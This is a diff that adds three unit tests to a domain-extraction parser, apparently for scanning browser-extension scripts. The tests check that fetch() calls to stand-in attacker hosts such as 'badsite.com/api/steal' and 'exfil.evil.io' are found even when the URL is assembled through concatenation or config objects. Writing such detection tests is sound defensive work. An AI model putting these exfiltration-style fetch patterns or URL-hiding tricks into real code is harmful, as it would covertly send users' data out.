@@ -217,6 +217,41 @@ describe('AstParserService', () => {
       expect(domains).toContain('collector.evil.xyz');
     });
 
+    it('resolves URLs built from chained constant concatenations', () => {
+      const code = `
+        const base = "https://badsite.com";
+        const endpoint = base + "/api/steal";
+        fetch(endpoint);
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'bg.js')
+        .map((d) => d.domain);
+      expect(domains).toContain('badsite.com');
+    });
+
+    it('resolves URLs stored inside config objects (obj.prop)', () => {
+      const code = `
+        const config = { apiUrl: "https://collector.evil.com/v1" };
+        fetch(config.apiUrl);
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'bg.js')
+        .map((d) => d.domain);
+      expect(domains).toContain('collector.evil.com');
+    });
+
+    it('resolves config objects whose properties depend on other constants', () => {
+      const code = `
+        const host = "exfil.evil.io";
+        const config = { url: "https://" + host + "/endpoint" };
+        fetch(config.url);
+      `;
+      const domains = service
+        .extractContactedDomains(code, 'bg.js')
+        .map((d) => d.domain);
+      expect(domains).toContain('exfil.evil.io');
+    });
+
     it('extracts dynamically loaded script and iframe resources as contacts', () => {
       const code = `
         const s = document.createElement("script");
